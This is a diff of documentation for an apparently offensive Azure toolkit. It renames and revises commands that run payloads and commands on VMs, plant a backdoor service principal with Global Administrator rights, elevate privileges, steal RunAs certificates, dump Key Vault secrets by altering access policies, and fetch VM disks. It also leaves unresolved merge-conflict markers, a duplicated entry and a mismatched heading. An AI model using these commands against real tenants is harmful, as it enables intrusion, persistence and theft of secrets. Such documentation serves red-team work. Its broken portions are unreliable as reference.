@@ -1,36 +1,27 @@
 Operational
 ===========
 
-Set-Subscription
+Set-AzureSubscription
 ----------------
 
 .. _**Synopsis**-45:
 
 **Synopsis**
 
-
 Sets default subscription. Necessary if in a tenant with multiple
 subscriptions.
-
-
-
-
-
 
 .. _**Syntax**-45:
 
 **Syntax**
 
-
-
 ::
 
-  Set-Subscription -Id [Subscription ID]
+  Set-AzureSubscription -Id [Subscription ID]
 
 .. _**Description**-45:
 
 **Description**
-
 
 Sets the default subscription
 
@@ -38,27 +29,17 @@ Sets the default subscription
 
 **Examples**
 
-
-
 ::
 
-  Set-Subscription -Id b049c906-7000-4899-b644-f3eb835f04d0
+  Set-AzureSubscription -Id b049c906-7000-4899-b644-f3eb835f04d0
 
 .. _**Parameters**-45:
 
 **Parameters** 
 
-
 -Id
 
 Subscription ID
-
-.. _required-modules-47:
-
-**Required Modules**
-
-
-Azure CLI
 
 .. _**Output**-45:
 
@@ -67,10 +48,7 @@ Azure CLI
 
 Success message
 
-
-
-
-Execute-Command
+Invoke-AzureRunCommand
 ---------------
 
 
@@ -89,7 +67,11 @@ Will run a command or script on a specified VM
 
 ::
 
-  Execute-Command -OS [OS] -ResourceGroup [RG Name] -VM [VM Name] -Command [Command]
+  Invoke-AzureRunCommand -VMName [VM Name] -Command [Command]
+  
+::
+
+  Invoke-AzureRunCommand -VMName [VM Name] -Script [Full Path To Script]  
 
 .. _**Description**-21:
 
@@ -97,9 +79,10 @@ Will run a command or script on a specified VM
 
 
 Executes a command on a virtual machine in Azure using 
+
 ::
 
-  az vm run-command invoke
+  Invoke-AzVMRunCommand
 
 .. _**Examples**-21:
 
@@ -108,22 +91,18 @@ Executes a command on a virtual machine in Azure using
 
 ::
 
-  Execute-Command -OS Windows -ResourceGroup TestRG -VM AzureWin10 -Command whoami
+  Invoke-AzureRunCommand -VMName AzureWin10 -Command whoami
+  
+::
+
+  Invoke-AzureRunCommand -VMName AzureWin10 -Script 'C:\temp\test.ps1'
 
 .. _**Parameters**-21:
 
 **Parameters** 
 
 
--OS
-
-Operating system, options are 'Linux' or 'Windows'
-
--ResourceGroup
-
-Resource group name the VM is located in
-
--VM
+-VMName
 
 Name of the virtual machine to execute the command on
 
@@ -131,12 +110,9 @@ Name of the virtual machine to execute the command on
 
 The command to be executed
 
-.. _required-modules-20:
+-Script
 
-**Required Modules**
-
-
-Azure CLI
+The path to the script to execute
 
 .. _**Output**-21:
 
@@ -145,7 +121,8 @@ Azure CLI
 
 Output of command being run or a failure message if failed
 
-Execute-MSBuild
+
+Invoke-AzureRunMSBuild
 ---------------
 
 .. _**Synopsis**-22:
@@ -170,7 +147,7 @@ SYSTEM.
 
 ::
 
-  Execute-MSBuild -ResourceGroup [RG Name] -VM [Virtual Machine name] -File [C:/path/to/payload/onyourmachine.xml]
+  Invoke-AzureRunMSBuild -VMName [Virtual Machine name] -File [C:/path/to/payload/onyourmachine.xml]
 
 .. _**Description**-22:
 
@@ -182,7 +159,7 @@ msbuild.exe with
 
 ::
 
-  az run-command invoke
+  Invoke-AzVMRunCommand
 
 .. _**Examples**-22:
 
@@ -192,20 +169,15 @@ msbuild.exe with
 
 ::
 
-  Execute-MSBuild -ResourceGroup TestRG -VM AzureWin10 -File C:\tempbuild.xml
+  Invoke-AzureRunMSBuildd -VMName AzureWin10 -File 'C:\temp\build.xml'
 
 .. _**Parameters**-22:
 
 **Parameters** 
 
 
--ResourceGroup
 
-
-Resource group name the VM is located in
-
-
--VM
+-VMName
 
 
 Name of the virtual machine to execute the command on
@@ -214,14 +186,7 @@ Name of the virtual machine to execute the command on
 -File
 
 
-Location of build.xml file
-
-.. _required-modules-21:
-
-**Required Modules**
-
-
-Azure CLI
+Path location of build.xml file
 
 .. _**Output**-22:
 
@@ -231,7 +196,7 @@ Azure CLI
 Success message of msbuild starting the build if successful, error
 message if upload failed.
 
-Execute-Program 
+Invoke-AzureRunProgram
 ---------------
 
 .. _**Synopsis**-23:
@@ -241,20 +206,13 @@ Execute-Program
 
 Will run a given binary on a specified VM
 
-
-
-
-
-
 .. _**Syntax**-23:
 
 **Syntax**
 
-
-
 ::
 
-  Execute-Program -ResourceGroup [RG Name] -VM [Virtual Machine name] -File [C:/path/to/payload.exe]
+  Invoke-AzureRunProgram  -VMName [Virtual Machine name] -File [C:/path/to/payload.exe]
 
 .. _**Description**-23:
 
@@ -266,7 +224,7 @@ uploads that file to the VM, then runs a command via
  
 ::
 
-  az run-command invoke
+  Invoke-AzVMRunCommand
 
 to decode the base64 byte stream to a .exe file, then executes
 the binary.
@@ -278,18 +236,13 @@ the binary.
 
 ::
 
-	Execute-Program -ResourceGroup TestRG -VM AzureWin10 -File C:\tempbeacon.exe
+	Invoke-AzureRunProgram -VMName AzureWin10 -File C:\tempbeacon.exe
 
 .. _**Parameters**-23:
 
 **Parameters** 
 
-
--ResourceGroup
-
-Resource group name the VM is located in
-
--VM
+-VMName
 
 Name of the virtual machine to execute the command on
 
@@ -297,202 +250,28 @@ Name of the virtual machine to execute the command on
 
 Location of executable binary
 
-.. _required-modules-22:
-
-**Required Modules**
-
-
-Azure CLI
-
 .. _**Output**-23:
 
 **Output**
 
 
-“Provisioning Succeeded” **Output**. Because it’s a binary being executed,
-there will be no native **Output** unless the binary is meant to return data
+“Provisioning Succeeded” Output. Because it’s a binary being executed,
+there will be no native Output unless the binary is meant to return data
 to stdout.
 
-Create-Backdoor
----------------
-
-.. _**Synopsis**-24:
-
-**Synopsis**
-
-
-Creates a backdoor in Azure via Runbooks
-
-
-
-
-
-
-.. _**Syntax**-24:
-
-**Syntax**
-
-
-::
-
-  Create-Backdoor -Username [Username] -Password [Password] -AutomationAccount [AA name] -ResourceGroup [RG Name] -NewUsername [New UN] -NewPassword [New Password]
-
-.. _**Description**-24:
-
-**Description**
-
-
-Will create a Runbook that creates an Azure account and generates a
-Webhook to that Runbook so it can be executed if you lose access to
-Azure. Also gives the ability to upload your own .ps1 file as a Runbook
-(Customization)
-
-This requires an account that is part of the 'Administrators' Role
-(Needed to make a user)
-
-.. _**Examples**-24:
-
-**Examples**
-
-
-::
-
-  Create-Backdoor -Username Administrator@contoso.com -Password Password! -AutomationAccount AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd
-
-
-.. _**Parameters**-24:
-
-**Parameters** 
-
-
--Username
-
-Username you used to login to Azure with, that has  to create
-a Runbook and user
-
--Password
-
-Password to that account
-
--AutomationAccount
-
-Azure Automation Account name
-
--ResourceGroup
-
-Resource Group name
-
--NewUsername
-
-Username you want to create
-
--NewPassword
-
-Password for that new account
-
-.. _required-modules-23:
-
-**Required Modules**
-
-
-Azure CLI
-
-Azure PowerShell
-
-.. _**Output**-24:
-
-**Output**
-
-
-URI if successful,  error if failure
-
-Execute-Backdoor 
-----------------
-
-.. _**Synopsis**-25:
-
-**Synopsis**
-
-
-This runs the backdoor URI that is created with "Create-Backdoor”
-
-
-
-
-
-
-.. _**Syntax**-25:
-
-**Syntax**
-
-
-
-::
-
-  Execute-Backdoor -URI [URI]
-
-.. _**Description**-25:
-
-**Description**
-
-
-Executes the URI created by Create-Backdoor
-
-.. _**Examples**-25:
-
-**Examples**
-
-
-
-::
-
-  Execute-Backdoor -URI https://s16events.azure-automation.net/webhooks?token=qol1XudydN13%2bI5bilBZzbCjdzTIcfs4Fj4yH61WvQ%3d
-
-.. _**Parameters**-25:
-
-**Parameters** 
-
-
--URI
-
-The URI generated by Create-Backdoor
-
-.. _required-modules-24:
-
-**Required Modules**
-
-
-| Azure CLI
-| Azure PowerShell
-
-.. _**Output**-25:
-
-**Output**
-
-
-Webhook successfully executed
-
-Execute-CommandRunbook
+Invoke-AzureCommandRunbook
 ----------------------
 
 .. _**Synopsis**-26:
 
 **Synopsis**
 
-
 Will execute a supplied command or script from a Runbook if the Runbook
 is configured with a "RunAs" account
-
-
-
-
-
 
 .. _**Syntax**-26:
 
 **Syntax**
-
-
 
 ::
 
@@ -511,15 +290,14 @@ correct  over the VM.
 
 **Examples**
 
+::
+
+  Invoke-AzureCommandRunbook -AutomationAccount TestAccount -ResourceGroup TestRG -VMName Win10Test -Command whoami
+
 
 ::
 
-  Execute-CommandRunbook -AutomationAccount TestAccount -ResourceGroup TestRG -VM Win10Test -Command whoami
-
-
-::
-
-  Execute-CommandRunbook -AutomationAccount TestAccount -ResourceGroup TestRG -VM Win10Test -Script "C:temptest.ps1"
+  Invoke-AzureCommandRunbook -AutomationAccount TestAccount -VMName Win10Test -Script "C:temptest.ps1"
 
 .. _**Parameters**-26:
 
@@ -530,11 +308,7 @@ correct  over the VM.
 
 Automation Account name
 
--ResourceGroup
-
-Resource Group name
-
--VM
+-VMName
 
 VM name
 
@@ -547,21 +321,68 @@ entire script
 
 Run an entire script instead of just one command.
 
-.. _required-modules-25:
-
-**Required Modules**
-
-
-Azure CLI
-
-Azure PowerShell
-
 .. _**Output**-26:
 
 **Output**
 
+Output of command if successfully ran.
 
-**Output** of command if successfully ran.
+
+Create-AzureBackdoor
+---------------
+
+.. _**Synopsis**-24:
+
+**Synopsis**
+
+
+Creates a backdoor in Azure via Service Principal
+
+.. _**Syntax**-24:
+
+**Syntax**
+
+
+::
+
+  Create-AzureBackdoor -Username [Username] -Password [Password] 
+
+.. _**Description**-24:
+
+**Description**
+
+
+Will create a new Service Principal in Azure and assign it to the Global Administrator/Company Administrator role in AzureAD. This can then be logged into and escalated to User Administrator in Azure RBAC with Set-AzureElevatedPrivileges
+
+.. _**Examples**-24:
+
+**Examples**
+
+::
+
+  Create-AzureBackdoor -Username 'testserviceprincipal' -Password 'Password!'
+
+
+.. _**Parameters**-24:
+
+**Parameters** 
+
+
+-Username
+
+Desired name of the Service Principal
+
+-Password
+
+Desired password for the account
+
+.. _**Output**-24:
+
+**Output**
+
+
+URI if successful,  error if failure
+
 
 Get-RunAsCertificate
 --------------------
@@ -571,13 +392,7 @@ Get-RunAsCertificate
 **Synopsis**
 
 
-Will gather a RunAs accounts certificate which can then be used to login
-as that account.
-
-
-
-
-
+Will gather a RunAs accounts certificate if one is being used by an automation account, which can then be used to login as that account. By default, RunAs accounts are contributors over the subscription. This function does take a minute to run.
 
 .. _**Syntax**-18:
 
@@ -585,8 +400,7 @@ as that account.
 
 ::
 
-  Get-RunAsCertificate -ResourceGroup [RG Name] -AutomationAccount [AA
-Name]
+  Get-AzureRunAsCertificate  -AutomationAccount [AA Name]
 
 .. _**Description**-18:
 
@@ -600,30 +414,15 @@ Creates a Runbook for the RunAs account to run, which will gather the RunAs Acco
 
 ::
 
-  Get-RunAsCertificate -ResourceGroup Test_RG -AutomationAccount
-TestAccount
+  Get-AzureRunAsCertificate -AutomationAccount TestAccount
 
 .. _**Parameters**-18:
 
 **Parameters**
 
-
--ResourceGroup
-
-Name of the resource group the Automation Account is located in.
-
 -AutomationAccount
 
 The name of the Automation Account.
-
-.. _required-modules-17:
-
-**Required Modules**
-
-
-Azure CLI
-
-Azure PowerShell
 
 .. _**Output**-18:
 
@@ -632,255 +431,7 @@ Azure PowerShell
 
 Connection string for the RunAs account
 
-
-Upload-StorageContent
----------------------
-
-.. _**Synopsis**-27:
-
-**Synopsis**
-
-
-Uploads a supplied file to a storage share.
-
-
-
-
-
-
-.. _**Syntax**-27:
-
-**Syntax**
-
-
-
-::
-
-  Upload-StorageContent -StorageAccount [Storage Account name] -Share [Storage share name] -File [File name to upload]
-
-.. _**Description**-27:
-
-**Description**
-
-
-Uploads a supplied file to a storage container located in a storage
-account
-
-.. _**Examples**-27:
-
-**Examples**
-
-
-
-::
-
-  Upload-StorageContent -StorageAccount TestName -Share TestShare -File secret.txt
-
-.. _**Parameters**-27:
-
-**Parameters** 
-
-
--StorageAccount
-
-Name of Storage account. Try Get-StorageAccounts for a list.
-
--File
-
-File to upload
-
--Share
-
-Share name to upload to
-
-.. _required-modules-26:
-
-**Required Modules**
-
-
-Azure CLI
-
-Azure Powershell
-
-.. _**Output**-27:
-
-**Output**
-
-
-Success message
-
-
-
-
-
-
-Stop-VM
--------
-
-.. _**Synopsis**-28:
-
-**Synopsis**
-
-
-Stops a Virtual Machine
-
-
-
-
-
-
-.. _**Syntax**-28:
-
-**Syntax**
-
-
-
-::
-
-   Stop-VM -VM [VM name] -ResourceGroup [RG] 
-
-.. _**Description**-28:
-
-**Description**
-
-
-Stops a VM
-
-.. _**Examples**-28:
-
-**Examples**
-
-
-
-::
-
-   Stop-VM -VM Example2016R2 -ResourceGroup Test_RG
-
-.. _**Parameters**-28:
-
-**Parameters** 
-
-
--VM
-
-Name of machine
-
--ResourceGroup
-
-Resource group the VM is located in
-
-.. _required-modules-27:
-
-**Required Modules**
-
-
-Azure CLI
-
-.. _**Output**-28:
-
-**Output**
-
-
-VM successfully stops
-
-Start-VM 
---------
-
-**Synopsis**
-
-Starts a Virtual Machine
-
-
-
-**Syntax**
-
-
-::
-
-   Start-VM -VM [VM name] -ResourceGroup [RG] 
-
-**Description**
-
-Starts a VM
-
-**Examples**
-
-
-::
-
-   Start-VM -VM Example2016R2 -ResourceGroup Test_RG
-
-**Parameters**
-
--VM
-
-Name of machine
-
--ResourceGroup
-
-Resource group the VM is located in
-
-.. _required-modules-28:
-
-**Required Modules**
-
-
-Azure CLI
-
-**Output**
-
-VM successfully starts
-
-.. _section-1:
-
-Restart-VM 
-----------
-
-**Synopsis**
-
-Restarts a Virtual Machine
-
-
-**Syntax**
-
-
-::
-
-   Restart-VM -VM [VM name] -ResourceGroup [RG] 
-
-**Description**
-
-Restarts a VM
-
-**Examples**
-
-
-::
-
-   Restart-VM -VM Example2016R2 -ResourceGroup Test_RG
-
-**Parameters**
-
--VM
-
-Name of machine
-
--ResourceGroup
-
-Resource group the VM is located in
-
-.. _required-modules-29:
-
-**Required Modules**
-
-
-Azure CLI
-
-**Output**
-
-VM successfully restarts
-
-Start-Runbook
+Start-AzureRunbook
 -------------
 
 .. _**Synopsis**-29:
@@ -890,20 +441,13 @@ Start-Runbook
 
 Starts a Runbook
 
-
-
-
-
-
 .. _**Syntax**-29:
 
 **Syntax**
 
-
-
 ::
 
-   Start-Runbook -Account [Automation Account name] -ResourceGroup [Resource Group name] -Runbook [Runbook name] 
+   Start-AzureRunbook -Account [Automation Account name] -Runbook [Runbook name] 
 
 .. _**Description**-29:
 
@@ -916,76 +460,57 @@ Starts a specified Runbook
 
 **Examples**
 
-
-
 ::
 
-   Start-Runbook -Account AutoAccountTest -ResourceGroup TestRG -Runbook TestRunbook 
+   Start-AzureRunbook -Account AutoAccountTest -Runbook TestRunbook 
 
 .. _**Parameters**-29:
 
 **Parameters** 
 
-
 -Account
 
 Name of Automation Account the Runbook is in
 
--ResourceGroup
-
-Resource group it's located in
-
 -Runbook
 
 Name of runbook
-
-.. _required-modules-30:
-
-**Required Modules**
-
-
-Azure CLI
-
-Azure PowerShell
 
 .. _**Output**-29:
 
 **Output**
 
 
-Runbook **Output**
+Runbook Output
 
-Set-Role
+Add-AzureADRole
 --------
 
 .. _**Synopsis**-30:
 
 **Synopsis**
 
-
-Assigns a user a role for a specific resource or subscription
-
-
-
-
-
+Assigns a specific Azure AD role to a User
 
 .. _**Syntax**-30:
 
 **Syntax**
 
+::
 
+  Add-AzureADRole -Username [User Principal Name] -Role '[Role name]'\
 
 ::
 
-  Set-Role -Role Owner -User [UPN] -Resource [Resource name]
+  Add-AzureADRole -UserId [UserId] -RoleId '[Role Id]'
+  
 
 .. _**Description**-30:
 
 **Description**
 
 
-Sets a role over a resource or subscription.
+Assigns a specific Azure AD role to a User using either the role name or ID and username or user ID.
 
 .. _**Examples**-30:
 
@@ -995,109 +520,41 @@ Sets a role over a resource or subscription.
 
 ::
 
-  Set-Role -Role Owner -User john@contoso.com -Resource WIN10VM
+  Add-AzureADRole -Username test@test.com -Role 'Company Administrator'
 
 
 ::
 
-  Set-Role -Role Owner -User john@contoso.com -Subscription SubName
+  Add-AzureADRole -UserId 6eca6b85-7a3d-4fcf-b8da-c15a4380d286 -Role '4dda258a-4568-4579-abeb-07709e34e307'
 
 .. _**Parameters**-30:
 
 **Parameters** 
 
 
--User
+-Username
 
 Name of user in format user@domain.com
+
+-UserId
+
+Id of the user
 
 -Role
 
 Role name (must be properly capitalized)
 
--Resource
+-RoleId
 
-Name of Resource
-
--Subscription
-
-Name of subscription
-
-.. _required-modules-31:
-
-**Required Modules**
-
-
-Azure CLI
+ID of the role
 
 .. _**Output**-30:
 
 **Output**
 
-
 Role successfully applied
 
-Remove-Role 
------------
-
-**Synopsis**
-
-Removes a user from a role for a specific resource or subscription
-
-
-**Syntax**
-
-
-::
-
-  Remove-Role -Role Owner -User [UPN] -Resource [Resource name]
-
-**Description**
-
-Removes a role over a resource or subscription.
-
-**Examples**
-
-
-::
-
-  Remove-Role -Role Owner -User john@contoso.com -Resource WIN10VM
-
-
-::
-
-  Remove-Role -Role Owner -User john@contoso.com -Subscription SubName
-
-**Parameters**
-
--User
-
-Name of user in format user@domain.com
-
--Role
-
-Role name (must be properly capitalized)
-
--Resource
-
-Name of Resource
-
--Subscription
-
-Name of subscription
-
-.. _required-modules-32:
-
-**Required Modules**
-
-
-Azure CLI
-
-**Output**
-
-Role successfully Removed
-
-Set-Group
+Add-AzureADGroup 
 ---------
 
 .. _**Synopsis**-31:
@@ -1107,20 +564,13 @@ Set-Group
 
 Adds a user to an Azure AD Group
 
-
-
-
-
-
 .. _**Syntax**-31:
 
 **Syntax**
 
-
-
 ::
 
-  Set-Group -User [UPN] -Group [Group name]
+  Add-AzureADGroup  -User [UPN] -Group [Group name]
 
 .. _**Description**-31:
 
@@ -1134,11 +584,9 @@ name in single quotes.
 
 **Examples**
 
-
-
 ::
 
-  Set-Group -User john@contoso.com -Group 'SQL Users' 
+  Add-AzureADGroup  -User john@contoso.com -Group 'SQL Users' 
 
 .. _**Parameters**-31:
 
@@ -1153,13 +601,6 @@ UPN of the user
 
 AAD Group name
 
-.. _required-modules-33:
-
-**Required Modules**
-
-
-Azure CLI
-
 .. _**Output**-31:
 
 **Output**
@@ -1167,7 +608,7 @@ Azure CLI
 
 User added to group
 
-Set-Password
+Set-AzureUserPassword
 ------------
 
 .. _**Synopsis**-32:
@@ -1177,43 +618,286 @@ Set-Password
 
 Sets a user's password
 
-
-
-
-
-
 .. _**Syntax**-32:
 
 **Syntax**
 
-
-
 ::
 
-  Set-Password -Username [UPN] -Password [new password]
+  Set-AzureUserPassword -Username [UPN] -Password [new password]
 
 .. _**Description**-32:
 
 **Description**
 
 
-Sets a user’s password. Requires AAD PS Module.
+Sets a user’s password. 
 
 .. _**Examples**-32:
 
 **Examples**
 
-
-
 ::
 
-  Set-Password -Username john@contoso.com -Password newpassw0rd1
+  Set-AzureUserPassword -Username john@contoso.com -Password newpassw0rd1
 
 .. _**Parameters**-32:
 
 **Parameters** 
 
 
+-Password
+
+New password for user
+
+-Username
+
+Name of user
+
+.. _**Output**-32:
+
+**Output**
+
+
+Password successfully set
+
+
+New-AzureUser
+------------
+
+.. _**Synopsis**-32:
+
+**Synopsis**
+
+
+Creates a user in Azure Active Directory
+
+.. _**Syntax**-32:
+
+**Syntax**
+
+::
+
+   New-AzureUser -Username [User Principal Name] -Password [Password]
+
+.. _**Description**-32:
+
+**Description**
+
+Creates a user in Azure Active Directory. Requires AAD PS Module.
+
+.. _**Examples**-32:
+
+**Examples**
+
+::
+
+   New-AzureUser -Username 'test@test.com' -Password Password1234
+
+.. _**Parameters**-32:
+
+**Parameters** 
+
+
+-Username 
+
+Name of user including domain
+
+-Password 
+
+New password for the user
+
+.. _**Output**-32:
+
+**Output**
+
+
+User is created
+
+
+Add-AzureSPSecret
+------------
+
+.. _**Synopsis**-32:
+
+**Synopsis**
+
+
+Adds a secret to a service principal
+
+
+.. _**Syntax**-32:
+
+**Syntax**
+
+::
+
+  Add-AzureSPSecret -ApplicationName [ApplicationName name] -Password [new secret]
+
+.. _**Description**-32:
+
+**Description**
+
+Adds a secret to a service principal so you can login as that service principal.
+
+.. _**Examples**-32:
+
+**Examples**
+
+::
+
+   Add-AzureSPSecret -ApplicationName "MyTestApp" -Password password123
+
+.. _**Parameters**-32:
+
+**Parameters** 
+
+-ApplicationName
+Name of the Service Principal or application that is using the Service principal
+
+-Password 
+New password "secret" for the Service Principal.
+
+.. _**Output**-32:
+
+**Output**
+
+Connection string to login as new user if successful
+
+
+Set-AzureElevatedPrivileges
+------------
+
+.. _**Synopsis**-32:
+
+**Synopsis**
+
+
+Elevates the user's privileges from Global Administrator in AzureAD to include User Access Administrator in Azure RBAC.
+
+
+.. _**Syntax**-32:
+
+**Syntax**
+
+::
+
+   Set-AzureElevatedPrivileges
+
+.. _**Description**-32:
+
+**Description**
+
+
+This works by making a Graph API call. You must be logged in as a user with Global Administator role assigned. You cannot elevate if you are a service principal; It's just not possible due to API limitiations.
+
+.. _**Examples**-32:
+
+**Examples**
+
+::
+
+   Set-AzureElevatedPrivileges
+
+.. _**Parameters**-32:
+
+**Parameters** 
+
+None
+
+.. _**Output**-32:
+
+**Output**
+
+No Error message if successful
+
+Add-AzureSPSecret
+------------
+
+.. _**Synopsis**-32:
+
+**Synopsis**
+
+Adds a secret to a service principal
+
+.. _**Syntax**-32:
+
+**Syntax**
+
+::
+
+   Add-AzureSPSecret -ApplicationName [Name of application] -Password [Password]
+
+.. _**Description**-32:
+
+**Description**
+
+
+Adds a secret to a service principal so a known password is set and can then be used to login as that principal.
+
+.. _**Examples**-32:
+
+**Examples**
+
+::
+
+   Add-AzureSPSecret -ApplicationName "ApplicationName" -Password password123
+
+.. _**Parameters**-32:
+
+**Parameters** 
+
+-ApplicationName
+Name of application the Service Principal is tied to
+
+-Password
+Desired password/secret
+
+.. _**Output**-32:
+
+**Output**
+
+No Error message if successful
+
+Get-AzureKeyVaultContent
+------------
+
+.. _**Synopsis**-32:
+
+**Synopsis**
+
+Get the secrets and certificates from a specific Key Vault or all of them
+
+.. _**Syntax**-32:
+
+**Syntax**
+
+::
+
+   Get-AzureKeyVaultContent -Name [Name of vault]
+
+.. _**Description**-32:
+
+**Description**
+
+Searches for all available key vaults and modifies the access policy to allow downloading of the contents in the vault. Then gets the secrets and certificates from the vault. This will display the contents of any certificates. To export a key or certificate, use Export-AzureKeyVaultContent
+
+.. _**Examples**-32:
+
+**Examples**
+
+::
+
+   Get-AzureKeyVaultContent -Name VaultName
+
+.. _**Parameters**-32:
+
+**Parameters** 
+
+-VaultName
+Key Vault Name
+
+<<<<<<< Updated upstream
 -Password
 
 New password for user
@@ -1229,172 +913,39 @@ Name of user
 
 Azure CLI
 
+=======
+-All 
+All Key Vaults
+>>>>>>> Stashed changes
 
 .. _**Output**-32:
 
 **Output**
 
+Contents of the key vault contents
 
-Password successfully set
-
-
-Create-User
+Export-AzureKeyVaultContent
 ------------
 
 .. _**Synopsis**-32:
 
 **Synopsis**
 
-
-Creates a user in Azure Active Directory
-
-
-
-
+Exports a Key as PEM or Certificate as PFX from the Key Vault
 
 .. _**Syntax**-32:
 
 **Syntax**
 
-
-
 ::
 
-   Create-User -Username [User Principal Name] -Password [Password]
+   Export-AzureKeyVaultContent -VaultName [Vault Name] -Type [Key or Certificate] -Name [Name of Key or Cert] -OutFilePath  [Full path of where to export]
 
 .. _**Description**-32:
 
 **Description**
 
-
-Creates a user in Azure Active Directory. Requires AAD PS Module.
-
-.. _**Examples**-32:
-
-**Examples**
-
-
-
-::
-
-   Create-User -Username 'test@test.com' -Password Password1234
-
-
-.. _**Parameters**-32:
-
-**Parameters** 
-
-
--Username 
-
-Name of user including domain
-
--Password 
-
-New password for the user
-
-.. _required-modules-34:
-
-**Required Modules**
-
-
-Azure CLI
-
-
-.. _**Output**-32:
-
-**Output**
-
-
-User is created
-
-
-Add-SPSecret
-------------
-
-.. _**Synopsis**-32:
-
-**Synopsis**
-
-
-Adds a secret to a service principal
-
-
-.. _**Syntax**-32:
-
-**Syntax**
-
-
-::
-
-   Add-SPSecret -ServicePrincipal [Service principal name] -Password [new secret]
-
-.. _**Description**-32:
-
-**Description**
-
-
-Adds a secret to a service principal so you can login as that service principal.
-
-.. _**Examples**-32:
-
-**Examples**
-
-
-::
-
-   Add-SPSecret -ServicePrincipal "MyTestApp" -Password password123
-
-
-.. _**Parameters**-32:
-
-**Parameters** 
-
--ServicePrincipal
-Name of the Service Principal or application that is using the Service principal
-
--Password 
-New password "secret" for the Service Principal.
-
-.. _required-modules-34:
-
-**Required Modules**
-
-Azure PowerShell
-
-.. _**Output**-32:
-
-**Output**
-
-Connection string to login as new user if successful
-
-
-Set-AADRoleSP
-------------
-
-.. _**Synopsis**-32:
-
-**Synopsis**
-
-
-Sets a user's role in AzureAD while logged in as a service principal
-
-
-.. _**Syntax**-32:
-
-**Syntax**
-
-
-::
-
-   Set-AADRoleSP -App [Application Name the SP is using] -Secret [Secret for the Application] -Role [Name of desired role] -User [UserPrincipalName to be added to the role]
-
-.. _**Description**-32:
-
-**Description**
-
-
-This works by making a Graph API call because there's no possible way of doing this with the AzureAD module while logged in as a service principal. The role is also searched via API call if not using a role ID. Using a role ID will be more accurate. The token used to make the API request is gathered from Azure CLI
+Searches for all available key vaults and modifies the access policy to allow downloading of the contents in the vault. Exports a Key as PEM or Certificate as PFX from the Key Vault
 
 .. _**Examples**-32:
 
@@ -1402,65 +953,58 @@ This works by making a Graph API call because there's no possible way of doing t
 
 ::
 
-   Set-AADRoleSP -App MyTestApp -Secret password1234 -Role "Company Administrators" -User "Hausec@test.com"
-
+   Export-AzureKeyVaultContent -VaultName VaultTest -Type Key -Name Testkey1234 -OutFilePath C:\Temp
 
 .. _**Parameters**-32:
 
 **Parameters** 
 
--App 
-Name of the Application that the Service Principal is tied to
+-VaultName
+Key Vault Name
 
--Secret 
-Secret of the Application/Service Principal
+-All 
+All Key Vaults
 
--Role 
-Desired role
+-Type
+Key or Certificate
 
--User 
-User Principal Name to add to role
+-Name 
+Name of Key or Certificate that is being extracted
 
-.. _required-modules-34:
-
-**Required Modules**
-
-Azure CLI
+<<<<<<< Updated upstream
+=======
+-OutFilePath
+Where to extract the key or certificate
+>>>>>>> Stashed changes
 
 .. _**Output**-32:
 
 **Output**
 
-Success message
+Successful export
 
-
-
-Set-ElevatedPrivileges
+Get-AzureStorageContent
 ------------
 
 .. _**Synopsis**-32:
 
 **Synopsis**
 
-
-Elevates the user's privileges from Global Administrator in AzureAD to include User Access Administrator in Azure RBAC.
-
+Gathers a file from a specific blob or File Share
 
 .. _**Syntax**-32:
 
 **Syntax**
 
-
 ::
 
-   Set-ElevatedPrivileges
+   Get-AzureStorageContent -StorageAccountName TestAcct -Type Container 
 
 .. _**Description**-32:
 
 **Description**
 
-
-This works by making a Graph API call because there's no possible way of doing this with any PowerShell modules. You must be logged in as a user with Global Administator role assigned. You cannot elevate if you are a service principal; It's just not possible for some reason. The token used to make the API request is gathered from Azure CLI
+Gathers a file from a specific blob or File Share
 
 .. _**Examples**-32:
 
@@ -1468,23 +1012,134 @@ This works by making a Graph API call because there's no possible way of doing t
 
 ::
 
-   Set-ElevatedPrivileges
+   Get-AzureStorageContent
 
+::
 
+   Get-AzureStorageContent -StorageAccountName TestAcct -Type Container 
+   
 .. _**Parameters**-32:
 
 **Parameters** 
 
-None
+-Share
+Name of the share the file is located in 
 
-.. _required-modules-34:
+-Path 
+Path of the file in the target share
 
-**Required Modules**
+-Blob 
+Name of the blob the file is located in 
 
-Azure CLI
+-StorageAccountName
+Name of a specific account
+
+-ResourceGroup
+The RG the Storage account is located in
+
+-ContainerName 
+Name of the Container the file is located in
 
 .. _**Output**-32:
 
 **Output**
 
-Success message
+Display of contents
+
+Get-AzureStorageContent
+------------
+
+.. _**Synopsis**-32:
+
+**Synopsis**
+
+Generates a link to download a Virtual Machiche's disk. The link is only available for 24 hours.
+
+.. _**Syntax**-32:
+
+**Syntax**
+
+::
+
+  Get-AzureVMDisk -DiskName [Name of Disk]    
+
+.. _**Description**-32:
+
+**Description**
+
+The VM must be turned off/disk not in use. While the link is active, the VM cannot be turned on.
+
+.. _**Examples**-32:
+
+**Examples**
+
+::
+
+  Get-AzureVMDisk -DiskName AzureWin10_OsDisk_1_c2c7da5a0838404c84a70d6ec097ebf5     
+
+   
+.. _**Parameters**-32:
+
+**Parameters** 
+
+-DiskName
+Name of the disk
+
+.. _**Output**-32:
+
+**Output**
+
+Link to download the disk
+
+Get-AzureRunbookContent
+------------
+
+.. _**Synopsis**-32:
+
+**Synopsis**
+
+Gets a specific Runbook and displays its contents or all runbook contents
+
+.. _**Syntax**-32:
+
+**Syntax**
+
+::
+
+  Get-AzureRunbookContent -Runbook [Name of Runbook] -OutFilePath [Path of where to export runbooks]
+
+.. _**Description**-32:
+
+**Description**
+
+Gets a specific Runbook and displays its contents or all runbook contents
+
+.. _**Examples**-32:
+
+**Examples**
+
+::
+
+  Get-AzureRunbookContent -Runbook Runbooktest -OutFilePath 'C:\temp'
+
+::
+
+  Get-AzureRunbookContent -All -OutFilePath 'C:\temp 
+  
+.. _**Parameters**-32:
+
+**Parameters** 
+
+-Runbook 
+Name of Runbook
+
+-All 
+
+-OutFilePath 
+Where to save Runbook
+
+.. _**Output**-32:
+
+**Output**
+
+Successful export of the runbooks
